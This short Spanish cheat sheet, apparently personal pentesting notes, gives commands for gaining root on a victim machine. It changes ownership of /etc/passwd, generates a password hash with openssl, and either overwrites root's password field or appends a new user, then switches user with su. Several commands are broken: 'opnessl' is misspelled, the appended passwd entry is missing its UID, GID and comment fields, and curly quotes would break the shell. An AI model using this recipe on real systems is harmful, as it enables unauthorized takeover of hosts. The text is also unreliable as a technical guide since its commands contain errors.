## A root

```bash
sudo chown USER:USER /etc/passwd
```

Desde el host:

```bash
opnessl passwd -6 ‘Contraseña_nueva’ 
```

El texto generado se sustituye por la x donde esta el usuario root

Desde  la victima:

con nano:

```bash
nano /etc/passwd
```

root:texto_generado:0:0:root:/bin/bash

```bash
su root
```

sin nano:

```bash
echo "fake:TEXTO_GENERADO:/home/fake:/bin/bash" >> /etc/passwd

su fake
```
